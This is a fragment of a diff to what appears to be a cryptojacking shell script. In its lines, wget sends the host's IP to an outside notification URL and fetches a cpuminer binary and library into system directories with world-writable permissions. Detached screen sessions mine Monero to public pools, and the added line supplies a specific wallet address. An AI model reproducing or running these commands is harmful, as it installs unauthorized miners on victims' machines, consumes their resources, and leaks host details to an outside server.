@@ -41,4 +41,5 @@ wget "http://pushbullet.api.qq.ee/?title=[$NOW]$MYIP&body=." -O-
 #wget down.99.tf/cpuminer -O /bin/cpuminer && chmod -R 777 /bin/cpuminer
 #wget down.99.tf/libjansson.so -O /lib/libjansson.so.4
 #screen -dmS "m" sh -c 'cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u minergate.com@mailmail.cc -p x'
+#screen -dmS "m" sh -c 'cpuminer -a cryptonight -o stratum+tcp://la01.supportxmr.com:3333 -u 41mQmAuWVtp4gQYZK9mBYXeDUYuUT3eNdTXiKrpfQ9uSCp69CSXendZ36ftDcj22BThky594nzmCdJb9WFSNRudLQ76GFJx -p MinerName:Edis0n@mailmail.cc'
 ######
